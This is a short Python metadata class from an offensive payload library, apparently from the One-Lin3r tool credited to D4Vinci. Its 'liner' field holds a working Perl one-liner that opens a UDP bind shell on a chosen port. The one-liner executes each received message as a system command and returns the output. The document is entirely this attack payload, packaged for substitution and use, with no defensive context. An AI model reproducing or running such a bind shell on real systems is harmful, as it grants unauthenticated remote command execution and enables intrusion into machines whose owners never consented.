class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses perl MIO socket to establish a bind shell on specifed port."
    function    = "bind shell"
    liner     = """perl -MIO::Socket::INET -e '$|=1;$VAR1=new IO::Socket::INET->new();$VAR1 = new IO::Socket::INET(LocalPort => PORT,Proto => "udp");while(NUM1){ $VAR1->recv($VAR2,1024);$VAR3=$VAR1->peerhost();$VAR4=$VAR1->peerport();$VAR5=qx($VAR2);$VAR1->send($VAR5);}'"""
